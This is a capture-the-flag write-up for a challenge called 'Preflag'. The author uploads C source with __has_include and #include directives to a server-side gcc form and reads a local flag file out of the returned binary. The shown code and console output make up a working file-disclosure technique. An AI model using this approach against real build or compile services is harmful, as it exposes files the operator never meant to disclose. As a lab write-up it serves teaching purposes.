# Preflag
Pwn, 10 points

## Description
> LFI is Local flag inclusion

## Solution

We enter the attached website and are presented with a short form:
```html
<html>
    <head>
    <title>Preflag</title>
    </head>
    <body>
        <form action="gcc" method="POST" enctype="multipart/form-data">
            <input type="file" name="inputFile"/>
            <button type="submit">Send</button>
        </form>
    </body>
</html>
```

Uploading different formats, we are receive an error message from the server. However, the form name (`gcc`) hints that we should be uploading a `C` file. Let's try it out:
```c
#include <stdio.h>

int main() 
{
   printf("Hello, World!");
   return 0;
}
```

As a result, we receive a file from the server:
```console
root@kali:/media/sf_CTFs/kaf/Preflag# file compiled
compiled: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=25c27c0449db49918b6a5d6655018af834a8e80f, not stripped
root@kali:/media/sf_CTFs/kaf/Preflag# strings compiled | grep Hello
Hello, World!
```

The server has compiled the source file and provided us with the result. This means that we can `#include` local files and hope to see the result in the compiled binary. Let's try different file names using the new [__has_include](https://gcc.gnu.org/onlinedocs/cpp/_005f_005fhas_005finclude.html) preprocessor operator. This way, we can supply multiple file names in the same attempt without failing compilation if any of them are missing:

```c
char* marker = "##MARKER##";
char* file = __FILE__;

#if __has_include("flag.txt")
char* __flag_txt = "__flag.txt__";
#include "flag.txt"
#endif

#if __has_include("flag")
char* __flag = "__flag__";
#include "flag"
#endif

#if __has_include("/flag.txt")
char* __flag_txt2 = "__/flag.txt__";
#include "/flag.txt"
#endif

#if __has_include("/flag")
char* __flag2 = "__/flag__";
#include "/flag"
#endif

#if __has_include("flag.h")
char* __flag_h = "__/flag.h__";
#include "flag.h"
#endif

#if __has_include("flag.c")
char* __flag_c = "__/flag.c__";
#include "flag.c"
#endif

int major = __GNUC__;
int minor = __GNUC_MINOR__;

int main() 
{
   return 0;
}
```

The result:
```console
root@kali:/media/sf_CTFs/kaf/Preflag# xxd -g 1 compiled | grep flag -A 5 -B 5
00001ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00002000: 01 00 02 00 00 00 00 00 23 23 4d 41 52 4b 45 52  ........##MARKER
00002010: 23 23 00 00 00 00 00 00 2f 74 6d 70 2f 35 64 66  ##....../tmp/5df
00002020: 63 39 61 38 32 2d 34 66 39 62 2d 34 32 63 37 2d  c9a82-4f9b-42c7-
00002030: 38 62 39 62 2d 31 34 63 37 63 38 32 34 61 33 36  8b9b-14c7c824a36
00002040: 32 2e 63 00 5f 5f 66 6c 61 67 5f 5f 00 4b 41 46  2.c.__flag__.KAF
00002050: 7b 50 52 33 50 52 30 43 33 35 35 5f 4c 31 4b 33  {PR3PR0C355_L1K3
00002060: 5f 31 5f 42 30 35 35 7d 00 00 00 00 01 1b 03 3b  _1_B055}.......;
00002070: 38 00 00 00 06 00 00 00 b4 ef ff ff 84 00 00 00  8...............
00002080: c4 ef ff ff ac 00 00 00 d4 ef ff ff 54 00 00 00  ............T...
00002090: b9 f0 ff ff c4 00 00 00 c4 f0 ff ff e4 00 00 00  ................
root@kali:/media/sf_CTFs/kaf/Preflag# strings compiled | grep KAF
KAF{PR3PR0C355_L1K3_1_B055}
```